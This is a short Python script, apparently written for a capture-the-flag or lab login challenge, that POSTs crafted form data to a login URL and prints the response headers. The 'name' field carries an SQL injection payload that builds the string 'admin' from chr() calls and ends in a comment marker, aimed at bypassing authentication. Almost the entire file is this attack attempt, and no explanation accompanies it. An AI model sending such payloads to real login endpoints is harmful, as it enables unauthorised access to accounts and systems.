import requests

TARGET_URL="http://junior-login.peykar.io/login"
test= {"user":"a",
"password":"a",
"name": {"chr(97)||chr(100)||chr(109)||chr(105)||chr(110) --":"String()"}}

r=requests.post(TARGET_URL,data=test)
print(r.headers)